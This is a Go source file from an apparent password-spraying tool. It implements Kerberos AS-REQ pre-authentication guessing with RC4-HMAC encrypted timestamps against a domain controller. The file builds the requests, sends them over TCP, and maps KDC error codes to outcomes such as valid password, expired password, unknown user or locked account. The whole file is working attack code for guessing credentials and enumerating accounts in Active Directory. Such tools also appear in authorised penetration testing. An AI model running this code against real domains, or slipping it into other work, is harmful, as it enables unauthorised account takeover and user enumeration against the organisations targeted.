package spray

import (
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/rc4"
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"golang.org/x/crypto/md4"
)

// Kerberos AS-REQ pre-authentication password spraying (etype 23, RC4-HMAC).
//
// For each credential we send an AS-REQ carrying a PA-ENC-TIMESTAMP encrypted
// with the key derived from the password (RC4-HMAC key = NT hash). The KDC's
// reply tells us whether the password was right:
//   - AS-REP                       -> password valid
//   - KRB-ERROR KEY_EXPIRED (23)   -> valid but expired
//   - KRB-ERROR PREAUTH_FAILED (24)-> wrong password (user exists)
//   - KRB-ERROR PRINCIPAL_UNKNOWN  -> user does not exist
//   - KRB-ERROR CLIENT_REVOKED     -> account disabled/locked
//   - KRB-ERROR ETYPE_NOSUPP       -> KDC refuses RC4 (needs AES); cannot spray
//
// NOTE: this wire path is verified by unit tests (crypto vectors, ASN.1
// round-trip, crafted KRB-ERROR parsing) but has not been validated against a
// live KDC in this environment.

const (
	krbErrPrincipalUnknown = 6
	krbErrEtypeNoSupp      = 14
	krbErrClientRevoked    = 18
	krbErrKeyExpired       = 23
	krbErrPreauthFailed    = 24
	krbErrPreauthRequired  = 25
)

// KerberosProbe is a ProbeFunc that checks one credential via AS-REQ pre-auth.
func KerberosProbe(t Target, user, password, domain string, timeout int) Outcome {
	realm := strings.ToUpper(domain)
	req, err := buildASREQ(user, password, realm)
	if err != nil {
		return Outcome{Definitive: false, Note: "asreq build: " + err.Error()}
	}

	resp, err := sendKerberosTCP(t.Host, t.Port, req, timeout)
	if err != nil {
		return Outcome{Definitive: false}
	}
	return parseKerberosResponse(resp)
}

func sendKerberosTCP(host string, port int, req []byte, timeout int) ([]byte, error) {
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	conn, err := net.DialTimeout("tcp", addr, time.Duration(timeout)*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second))

	framed := make([]byte, 4+len(req))
	binary.BigEndian.PutUint32(framed[:4], uint32(len(req)))
	copy(framed[4:], req)
	if _, err := conn.Write(framed); err != nil {
		return nil, err
	}

	var lenBuf [4]byte
	if _, err := readFull(conn, lenBuf[:]); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(lenBuf[:])
	if n == 0 || n > 1<<20 {
		return nil, fmt.Errorf("bad kerberos response length %d", n)
	}
	body := make([]byte, n)
	if _, err := readFull(conn, body); err != nil {
		return nil, err
	}
	return body, nil
}

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		nn, err := conn.Read(buf[total:])
		if nn > 0 {
			total += nn
		}
		if err != nil {
			return total, err
		}
	}
	return total, nil
}

// parseKerberosResponse maps an AS-REP / KRB-ERROR reply to an Outcome.
func parseKerberosResponse(resp []byte) Outcome {
	if len(resp) < 2 {
		return Outcome{Definitive: false}
	}
	switch resp[0] {
	case 0x6b: // [APPLICATION 11] AS-REP
		return Outcome{Definitive: true, Valid: true}
	case 0x7e: // [APPLICATION 30] KRB-ERROR
		code, ok := krbErrorCode(resp)
		if !ok {
			return Outcome{Definitive: false}
		}
		return mapKrbError(code)
	default:
		return Outcome{Definitive: false}
	}
}

func mapKrbError(code int) Outcome {
	switch code {
	case krbErrKeyExpired:
		return Outcome{Definitive: true, Valid: true, Note: "password valid but EXPIRED"}
	case krbErrPreauthFailed:
		return Outcome{Definitive: true, Valid: false}
	case krbErrPrincipalUnknown:
		return Outcome{Definitive: true, Valid: false, Note: "user does not exist"}
	case krbErrClientRevoked:
		return Outcome{Definitive: true, Valid: false, Note: "account disabled or locked out"}
	case krbErrEtypeNoSupp:
		return Outcome{Definitive: false, Note: "KDC refused RC4 (etype not supported; RC4 spray needs AES support)"}
	case krbErrPreauthRequired:
		return Outcome{Definitive: false, Note: "preauth required (unexpected response to a preauth AS-REQ)"}
	default:
		return Outcome{Definitive: true, Valid: false, Note: fmt.Sprintf("krb-error %d", code)}
	}
}

// krbErrorCode extracts the error-code ([6] Int32) from a KRB-ERROR message.
func krbErrorCode(resp []byte) (int, bool) {
	tag, content, _, ok := readTLV(resp)
	if !ok || tag != 0x7e {
		return 0, false
	}
	tag, seq, _, ok := readTLV(content)
	if !ok || tag != 0x30 {
		return 0, false
	}
	for len(seq) > 0 {
		t, c, rest, ok := readTLV(seq)
		if !ok {
			return 0, false
		}
		if t == 0xA6 { // [6] error-code
			it, iv, _, ok := readTLV(c)
			if !ok || it != 0x02 {
				return 0, false
			}
			return beInt(iv), true
		}
		seq = rest
	}
	return 0, false
}

// buildASREQ constructs a TCP-less AS-REQ with a PA-ENC-TIMESTAMP for user in realm.
func buildASREQ(user, password, realm string) ([]byte, error) {
	key := ntHash(password)

	confounder := make([]byte, 8)
	if _, err := rand.Read(confounder); err != nil {
		return nil, err
	}
	now := time.Now().UTC()
	patsEnc := derSeq(ctxTag(0, derGenTime(kerbTime(now))))
	cipher := rc4HMACEncrypt(key, 1, patsEnc, confounder)

	encData := derSeq(
		ctxTag(0, derInt(23)),             // etype = RC4-HMAC
		ctxTag(2, derOctetString(cipher)), // cipher
	)
	paData := derSeq(
		ctxTag(1, derInt(2)),               // padata-type = PA-ENC-TIMESTAMP
		ctxTag(2, derOctetString(encData)), // padata-value
	)

	nonce, err := randNonce()
	if err != nil {
		return nil, err
	}
	till := kerbTime(now.AddDate(10, 0, 0))

	reqBody := derSeq(
		ctxTag(0, derBitString([]byte{0x40, 0x81, 0x00, 0x10})), // kdc-options
		ctxTag(1, principalName(1, user)),                       // cname (NT-PRINCIPAL)
		ctxTag(2, derGeneralString(realm)),                      // realm
		ctxTag(3, principalName(2, "krbtgt", realm)),            // sname (NT-SRV-INST)
		ctxTag(5, derGenTime(till)),                             // till
		ctxTag(7, derInt(nonce)),                                // nonce
		ctxTag(8, derSeq(derInt(23))),                           // etype [RC4-HMAC]
	)

	kdcReq := derSeq(
		ctxTag(1, derInt(5)),  // pvno
		ctxTag(2, derInt(10)), // msg-type = AS-REQ
		ctxTag(3, derSeq(paData)),
		ctxTag(4, reqBody),
	)
	return appTag(10, kdcReq), nil // [APPLICATION 10] AS-REQ
}

func principalName(nameType int, names ...string) []byte {
	parts := make([][]byte, 0, len(names))
	for _, n := range names {
		parts = append(parts, derGeneralString(n))
	}
	return derSeq(
		ctxTag(0, derInt(nameType)),
		ctxTag(1, derSeq(parts...)),
	)
}

// ---- Kerberos RC4-HMAC crypto (RFC 4757) ----

func ntHash(password string) []byte {
	u := utf16.Encode([]rune(password))
	b := make([]byte, 0, len(u)*2)
	for _, r := range u {
		b = append(b, byte(r), byte(r>>8))
	}
	h := md4.New()
	_, _ = h.Write(b)
	return h.Sum(nil)
}

func hmacMD5(key, data []byte) []byte {
	m := hmac.New(md5.New, key)
	m.Write(data)
	return m.Sum(nil)
}

// rc4HMACEncrypt implements RFC 4757 encryption. confounder must be 8 bytes.
func rc4HMACEncrypt(key []byte, usage int, plaintext, confounder []byte) []byte {
	t := make([]byte, 4)
	binary.LittleEndian.PutUint32(t, uint32(rc4Usage(usage)))
	k1 := hmacMD5(key, t)

	data := make([]byte, 0, len(confounder)+len(plaintext))
	data = append(data, confounder...)
	data = append(data, plaintext...)

	checksum := hmacMD5(k1, data)
	k3 := hmacMD5(k1, checksum)

	c, _ := rc4.NewCipher(k3)
	enc := make([]byte, len(data))
	c.XORKeyStream(enc, data)

	return append(append([]byte{}, checksum...), enc...)
}

func rc4Usage(usage int) int {
	switch usage {
	case 3, 9:
		return 8
	case 23:
		return 13
	default:
		return usage
	}
}

func randNonce() (int, error) {
	var b [4]byte
	if _, err := rand.Read(b[:]); err != nil {
		return 0, err
	}
	return int(binary.BigEndian.Uint32(b[:]) & 0x7fffffff), nil
}

func kerbTime(t time.Time) string { return t.Format("20060102150405") + "Z" }

// ---- Minimal DER encoders ----

func derLen(n int) []byte {
	if n < 0x80 {
		return []byte{byte(n)}
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte(n & 0xff)}, b...)
		n >>= 8
	}
	return append([]byte{byte(0x80 | len(b))}, b...)
}

func tlv(tag byte, content []byte) []byte {
	out := append([]byte{tag}, derLen(len(content))...)
	return append(out, content...)
}

func derInt(v int) []byte {
	if v == 0 {
		return tlv(0x02, []byte{0x00})
	}
	var b []byte
	for n := v; n > 0; n >>= 8 {
		b = append([]byte{byte(n & 0xff)}, b...)
	}
	if b[0]&0x80 != 0 { // keep it positive
		b = append([]byte{0x00}, b...)
	}
	return tlv(0x02, b)
}

func derOctetString(b []byte) []byte      { return tlv(0x04, b) }
func derGeneralString(s string) []byte    { return tlv(0x1b, []byte(s)) }
func derGenTime(s string) []byte          { return tlv(0x18, []byte(s)) }
func derBitString(bits []byte) []byte     { return tlv(0x03, append([]byte{0x00}, bits...)) }
func ctxTag(n int, content []byte) []byte { return tlv(byte(0xA0|n), content) }
func appTag(n int, content []byte) []byte { return tlv(byte(0x60|n), content) }

func derSeq(parts ...[]byte) []byte {
	var content []byte
	for _, p := range parts {
		content = append(content, p...)
	}
	return tlv(0x30, content)
}

// readTLV decodes one DER element, returning its tag, content, the trailing
// bytes after it, and whether decoding succeeded.
func readTLV(b []byte) (tag byte, content, rest []byte, ok bool) {
	if len(b) < 2 {
		return 0, nil, nil, false
	}
	tag = b[0]
	p := 1
	l := int(b[p])
	p++
	if l&0x80 != 0 {
		n := l & 0x7f
		if n == 0 || n > 4 || p+n > len(b) {
			return 0, nil, nil, false
		}
		l = 0
		for i := 0; i < n; i++ {
			l = l<<8 | int(b[p+i])
		}
		p += n
	}
	if p+l > len(b) {
		return 0, nil, nil, false
	}
	return tag, b[p : p+l], b[p+l:], true
}

func beInt(b []byte) int {
	v := 0
	for _, c := range b {
		v = v<<8 | int(c)
	}
	return v
}
